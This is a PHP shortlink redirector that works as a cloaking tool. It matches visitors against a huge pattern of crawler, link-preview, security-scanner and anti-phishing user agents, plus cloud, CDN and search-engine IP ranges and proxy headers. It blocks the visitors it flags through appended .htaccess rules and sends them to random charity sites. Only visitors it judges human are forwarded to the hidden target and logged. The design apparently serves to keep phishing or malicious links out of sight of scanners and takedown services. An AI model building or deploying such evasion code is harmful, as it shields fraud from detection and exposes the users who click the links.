<?php
ob_start();
session_start();

function writeLog($message) {
    $logFile = 'log/error.log';
    $time = date('Y-m-d H:i:s');
    file_put_contents($logFile, "[$time] $message\n", FILE_APPEND);
}

function writeFile($file, $mode, $content) {
    $handle = @fopen($file, $mode); // Suppress warning
    if ($handle === false) {
        error_log("Failed to open file $file for writing");
        return false;
    }
    fwrite($handle, $content);
    fclose($handle);
    return true;
}

function getBaseUrl() {
    return sprintf(
        "%s://%s%s",
        isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http',
        $_SERVER['HTTP_HOST'],
        str_replace(basename($_SERVER['SCRIPT_NAME']), '', $_SERVER['SCRIPT_NAME'])
    );
}

function getGeoInfo($ip_address) {
    if (!filter_var($ip_address, FILTER_VALIDATE_IP)) {
        return ['country_code' => 'Invalid'];
    }
    $url = "https://ipwho.is/" . $ip_address;
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log("cURL Error (geo): " . curl_error($ch));
        curl_close($ch);
        return ['country_code' => 'Unknown'];
    }
    curl_close($ch);
    return json_decode($response, true) ?: ['country_code' => 'Unknown'];
}

function blockIp($ip) {
    global $htaccess_file;
    $redirect_url = getRandomUri();
    
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        error_log("Invalid IP for blocking: $ip");
        performRedirect($redirect_url);
        return;
    }
    
    $rule = "\nRewriteCond %{REMOTE_ADDR} ^" . preg_quote($ip, '/') . "$\nRewriteRule .* " . $redirect_url . " [R,L]\n";
    writeFile($htaccess_file, 'a', $rule);
    performRedirect($redirect_url);
}

function getRandomUri() {
    $uri = [
        'https://stjude.org', 'https://camfed.org', 'https://redcross.org', 'https://gofundme.com',
        'https://salvationarmyusa.org', 'https://donatelife.net', 'https://donatelifedc.org', 'https://healpalestine.org',
        'https://pcrf.net', 'https://savethechildren.org', 'https://unrwa.org', 'https://justgiving.com',
        'https://charitynavigator.org', 'https://givewell.org', 'https://globalgiving.org', 'https://kiva.org',
        'https://worldwildlife.org', 'https://feedingamerica.org', 'https://doctorswithoutborders.org',
        'https://nature.org', 'https://unicef.org', 'https://cancer.org', 'https://hrw.org',
        'https://humanesociety.org', 'https://aidschicago.org', 'https://oxfam.org', 'https://rainforesttrust.org',
        'https://thetrevorproject.org', 'https://habitat.org', 'https://amnesty.org', 'https://alz.org',
        'https://covenanthouse.org', 'https://aspca.org', 'https://npr.org/donations', 'https://plannedparenthood.org',
        'https://woundedwarriorproject.org'
    ];
    shuffle($uri);
    return $uri[0];
}

function performRedirect($uri = '', $method = 'auto', $code = null) {
    if (!preg_match('#^(\w+:)?//#i', $uri)) {
        $uri = getBaseUrl() . ltrim($uri, '/');
    }
    $code = $code ?? (($_SERVER['REQUEST_METHOD'] === 'GET') ? 307 : 303);
    $method = ($method === 'auto' && stripos($_SERVER['SERVER_SOFTWARE'] ?? '', 'Microsoft-IIS') !== false) ? 'refresh' : $method;
    
    if ($method === 'refresh') {
        header("Refresh:0;url=$uri");
    } else {
        header("Location: $uri", true, $code);
    }
    exit;
}

function checkBotBlocker($ip, $bots) {
    static $bot_ip_ranges = [
        '66.249.64.0/19', '64.233.160.0/19', '72.14.192.0/18', '35.184.0.0/13', '34.64.0.0/10', '216.58.192.0/19',
        '157.55.0.0/16', '207.46.0.0/16', '40.76.0.0/14', '13.64.0.0/11',
        '5.45.0.0/16', '5.255.0.0/16', '77.88.0.0/18', '95.108.128.0/17',
        '123.125.0.0/16', '220.181.0.0/16', '180.76.0.0/16', '39.156.0.0/16',
        '20.191.45.0/24', '40.88.21.0/24', '52.142.26.0/24',
        '198.244.186.192/26', '54.36.148.0/24',
        '85.208.96.0/21', '192.243.48.0/20', '185.191.171.0/24',
        '63.143.32.0/19', '69.162.64.0/18', '216.244.64.0/20',
        '104.16.0.0/12', '172.64.0.0/13', '173.245.48.0/20', '141.101.64.0/18',
        '208.180.20.0/24', '198.20.69.0/24', '71.6.146.0/24', '93.120.27.0/24',
        '192.150.188.0/24', '162.246.184.0/22', '167.94.145.0/24',
        '3.0.0.0/8', '18.0.0.0/8', '54.0.0.0/8', '52.0.0.0/8',
        '104.131.0.0/16', '167.99.0.0/16', '64.225.0.0/16',
        '51.68.0.0/16', '135.125.0.0/16', '145.239.0.0/16',
        '45.33.0.0/16', '173.255.192.0/18', '198.58.96.0/19',
        '5.9.0.0/16', '88.99.0.0/16', '148.251.0.0/16',
        '34.192.0.0/10', '44.192.0.0/11', '13.52.0.0/14',
        '69.46.0.0/19', '208.82.96.0/22',
        '103.84.108.0/22', '165.225.112.0/20'
    ];

    foreach ($bot_ip_ranges as $cidr) {
        if (matchCidr($ip, $cidr)) {
            return true;
        }
    }

    return false; // Pengecekan blacklist dipindah ke script utama
}

function matchCidr($ip, $cidr) {
    list($subnet, $mask) = explode('/', $cidr);
    return (ip2long($ip) & ~((1 << (32 - $mask)) - 1)) == ip2long($subnet);
}

function checkProxy($ip) {
    $forwarded_headers = [
        'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR',
        'HTTP_CLIENT_IP', 'HTTP_VIA', 'HTTP_FORWARDED', 'HTTP_X_REAL_IP'
    ];
    foreach ($forwarded_headers as $header) {
        if (!empty($_SERVER[$header])) {
            $value = $_SERVER[$header];
            if ($header === 'HTTP_X_FORWARDED_FOR') {
                $ips = explode(',', $value);
                $first_ip = trim($ips[0]);
                if ($first_ip !== $ip && filter_var($first_ip, FILTER_VALIDATE_IP)) {
                    return true;
                }
            } elseif (filter_var($value, FILTER_VALIDATE_IP) && $value !== $ip) {
                return true;
            } elseif ($header === 'HTTP_VIA' || $header === 'HTTP_FORWARDED') {
                return true;
            }
        }
    }

    $proxy_ports = [
        80, 81, 443, 1080, 1081, 3128, 4444, 553, 554, 6588, 
        8000, 8080, 8081, 8118, 8123, 8443, 8888, 9050, 9999
    ];
    $remote_port = $_SERVER['REMOTE_PORT'] ?? 0;
    if (in_array($remote_port, $proxy_ports)) {
        return true;
    }

    $proxy_ranges = [
        '173.245.0.0-173.245.255.255', '104.16.0.0-104.31.255.255', 
        '162.158.0.0-162.159.255.255', '103.21.244.0-103.21.247.255', 
        '185.2.100.0-185.2.103.255', '45.32.0.0-45.63.255.255', 
        '104.236.0.0-104.236.255.255', '198.41.128.0-198.41.255.255'
    ];
    foreach ($proxy_ranges as $range) {
        list($start, $end) = explode('-', $range);
        $ip_num = ip2long($ip);
        if ($ip_num >= ip2long($start) && $ip_num <= ip2long($end)) {
            return true;
        }
    }

    return false;
}

function getDeviceIcon() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
    if (preg_match('/mobile|android|iphone|ipod|blackberry|windows phone|symbian|kindle|opera mini|webos|palm|nokia|samsung|sonyericsson|lg|htc/', $ua)) {
        return "<i class='fa-solid fa-mobile-alt'></i>";
    } elseif (preg_match('/ipad|tablet|playbook|xoom|galaxy tab|surface|kindle fire/', $ua)) {
        return "<i class='fa-solid fa-tablet-alt'></i>";
    } elseif (preg_match('/smarttv|appletv|roku|firetv|chromecast|xbox|playstation|switch|wii/', $ua)) {
        return "<i class='fa-solid fa-tv'></i>";
    } elseif (preg_match('/bot|crawler|spider|googlebot|bingbot|yandex|baidu|ahrefs|semrush/', $ua)) {
        return "<i class='fa-solid fa-robot'></i>";
    }
    return "<i class='fa-solid fa-desktop'></i>";
}

function recordStats($short_code, $isBot = false) {
    $fileLog = 'log/stats.log';
    $time = date('Y-m-d H:i:s');
    $ip = filter_var($_SERVER['REMOTE_ADDR'] ?? '', FILTER_VALIDATE_IP) ?: '0.0.0.0';
    $status = $isBot ? 'ROBOT' : 'HUMAN';
    $entryLog = "$short_code|$time|$ip|$status";
    
    file_put_contents($fileLog, "$entryLog\n", FILE_APPEND);
}

// --- SCRIPT STARTS ---
header("Content-Type: text/html; charset=UTF-8");
$file = 'function/urls_config.json';
$htaccess_file = '.htaccess';
$bot_redirect = getRandomUri();

if (!file_exists($file)) {
    die("Shortlink config not found!");
}

$shortlinks = json_decode(file_get_contents($file), true) ?: [];
$short_code = $_GET['code'] ?? '';
$client_ip = filter_var($_SERVER['REMOTE_ADDR'] ?? '', FILTER_VALIDATE_IP) ?: '0.0.0.0';
$datetime = date('Y-m-d H:i:s');
$geo_info = getGeoInfo($client_ip);
$country = $geo_info['country_code'] ?? 'Unknown';
$device_icon = getDeviceIcon();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Pengecekan awal untuk log/blacklist.log
$blacklist_file = 'log/blacklist.log';
if (file_exists($blacklist_file)) {
    $blacklist = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blacklist)) {
        writeLog("IP $client_ip found in blacklist, blocking immediately");
        file_put_contents('log/blackvisit.log', "$client_ip\n", FILE_APPEND); // Catat ke blackvisit.log
        file_put_contents('log/view.log', "$client_ip|$datetime|$country|BLACKVISIT|$device_icon|$user_agent\n", FILE_APPEND); // Catat ke view.log
        blockIp($client_ip); // Langsung blokir dan redirect
    }
}

// Lanjutkan pengecekan bot/proxy jika tidak ada di blacklist
$bot_patterns = "/bot|crawler|spider|scan|probe|crawl|fetch|extract|harvest|aws|curl|slurp|phish|search|libwww|python|perl|ruby|php|java|go-http|httpclient|scrapy|wget|lynx|phantomjs|headless|robot|" .
                "Googlebot|Bingbot|YandexBot|DuckDuckBot|Baiduspider|Sogou|Exabot|MJ12bot|AhrefsBot|SemrushBot|DotBot|SeznamBot|Qwantify|ia_archiver|archive\.org_bot|CommonCrawl|CCBot|Slurp|Teoma|Gigabot|Charlotte|Rogerbot|Alexabot|BacklinkCrawler|OpenLinkProfiler|linkdexbot|OutclicksBot|LinkWalker|ScoutJet|" .
                "Twitterbot|Facebot|facebookexternalhit|LinkedInBot|Slackbot|Discordbot|TelegramBot|WhatsApp|SkypeUriPreview|Pinterestbot|Instagram|Snapchat|Viber|LineBot|WeChat|Redditbot|TikTok|" .
                "UptimeRobot|Pingdom|Site24x7|Nagios|Zabbix|PRTG|NewRelic|Datadog|AppDynamics|Dynatrace|Prometheus|StatusCake|Monit|CheckMK|BetterUptime|Uptime|NodePing|Freshping|HetrixTools|Blackfire|SolarWinds|Icinga|Opsview|Catchpoint|ThousandEyes|LogicMonitor|Runscope|Monitis|" .
                "CensysInspect|Shodan|Netcraft|Qualys|Nessus|OpenVAS|Burp|OWASP|Acunetix|Nikto|Wappalyzer|WhatWeb|masscan|Nmap|ZmEu|sqlmap|Metasploit|Hydra|JohnTheRipper|Hashcat|Cain|Aircrack|Kali|FoxyProxy|DirBuster|WFuzz|Skipfish|Grendel-Scan|WebScarab|Paros|W3af|Arachni|Vega|IronWASP|AppScan|Fortify|Retina|Rapid7|InsightVM|Nexpose|Tenable|BeyondTrust|Snyk|WhiteHat|Checkmarx|Veracode|SonarQube|Bandit|ZAP|Intruder|Probely|XSSer|XSStrike|Commix|JoomScan|WPScan|Drozer|MobSF|APKTool|Dex2Jar|Radare2|Ghidra|IDA|OllyDbg|Wireshark|tcpdump|" .
                "BuiltWith|WebPageTest|GTmetrix|YSlow|PageSpeed|Postman|Insomnia|SoapUI|Restlet|Fiddler|Charles|BrowserStack|SauceLabs|LambdaTest|BlazeMeter|LoadRunner|JMeter|Gatling|Locust|K6|Selenium|WebDriver|Cypress|Playwright|Puppeteer|TestCafe|Nightwatch|Protractor|Robot Framework|Behat|Cucumber|SpecFlow|Mocha|Chai|Jest|QUnit|Axe|Pa11y|Lighthouse|" .
                "Cloudflare|Akamai|Fastly|Incapsula|Sucuri|Imperva|CloudFront|CDN77|KeyCDN|Edgecast|Zscaler|MaxCDN|StackPath|Netlify|Vercel|Render|Heroku|DigitalOcean|Linode|OVH|Hetzner|Vultr|Azure|GCP|AWS|Tor|Privoxy|Squid|HAProxy|NginxProxy|Shadowsocks|WireGuard|OpenVPN|SoftEther|AnyConnect|" .
                "python-requests|urllib|okhttp|guzzle|axios|aiohttp|requests|mechanize|lwp-trivial|httpie|restsharp|faraday|typhoeus|excon|httpx|node-fetch|undici|gotcha|curl\/|libcurl|Apache-HttpClient|Jakarta|HttpURLConnection|WinHttp|WinINet|CFNetwork|Alamofire|NSURLSession|fetch\(|axios\/|HTTrack|WinHTTrack|Download Accelerator|Teleport|Offline Explorer|SiteSucker|WebCopy|WebReaver|" .
                "Mozilla\/5\.0 \(compatible;.*\)|compatible;.*|bot\/|crawler\/|spider\/|scan\/|probe\/|fetch\/|extract\/|harvest\/|unknown|anonymous|blackbox|shadow|ghost|recon|intel|threat|audit|monitor|check|test|benchmark|research|survey|analysis|discovery|index|spoof|fake|simulator|emulator/i";

writeLog("Checking bot/proxy for IP: $client_ip");
writeLog("User Agent: " . $user_agent);

if (preg_match($bot_patterns, strtolower($user_agent)) || checkBotBlocker($client_ip, true) || checkProxy($client_ip)) {
    writeLog("Detected bot/proxy, IP: $client_ip");
    writeLog("Result: BOT");
    file_put_contents('log/view.log', "$client_ip|$datetime|$country|ROBOT|$device_icon|$user_agent\n", FILE_APPEND);
    file_put_contents('log/robot.log', "$client_ip\n", FILE_APPEND);
    if (!empty($short_code) && isset($shortlinks[$short_code])) {
        recordStats($short_code, true); // Valid shortcode, detected as bot
    }
    blockIp($client_ip);
} else {
    writeLog("Result: NOT A BOT");
}

// Check shortcode
if (empty($short_code) || !isset($shortlinks[$short_code])) {
    $uri = $_SERVER['REQUEST_URI'];
    writeLog("Check shortcode: empty or not found");
    writeLog("URI: $uri");
    writeLog("Blocking IP: $client_ip");
    file_put_contents('log/view.log', "$client_ip|$datetime|$country|PARAMETER|$device_icon|$user_agent\n", FILE_APPEND);
    file_put_contents('log/blocked.log', "$client_ip\n", FILE_APPEND);
    blockIp($client_ip);
}

// Check Blackbox API
writeLog("Starting Blackbox API check for IP: $client_ip");
$ch = curl_init("https://blackbox.ipinfo.app/lookup/$client_ip");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 10
]);
$response = curl_exec($ch);
writeLog("Blackbox Response: " . ($response === false ? "Failed" : trim($response)));
if (curl_errno($ch)) {
    writeLog("cURL Error (Blackbox): " . curl_error($ch));
    error_log("cURL Error (Blackbox): " . curl_error($ch));
} elseif (trim($response) === 'Y') {
    writeLog("Blackbox detected 'Y', blocking IP: $client_ip");
    file_put_contents('log/view.log', "$client_ip|$datetime|$country|BLACKBOX|$device_icon|$user_agent\n", FILE_APPEND);
    file_put_contents('log/robot.log', "$client_ip\n", FILE_APPEND);
    if (!empty($short_code) && isset($shortlinks[$short_code])) {
        recordStats($short_code, true); // Valid shortcode, detected as bot by Blackbox
    }
    blockIp($client_ip);
}
curl_close($ch);

// Log success and redirect (only if shortcode is valid and not a bot)
if (!empty($short_code) && isset($shortlinks[$short_code])) {
    writeLog("Logging success for IP: $client_ip");
    file_put_contents('log/view.log', "$client_ip|$datetime|$country|HUMAN|$device_icon|$user_agent\n", FILE_APPEND);
    file_put_contents('log/real.log', "$client_ip\n", FILE_APPEND);
    recordStats($short_code, false); // Valid shortcode, not a bot
    writeLog("Redirecting to: " . $shortlinks[$short_code]);
    performRedirect($shortlinks[$short_code]);
}

ob_end_flush();
?>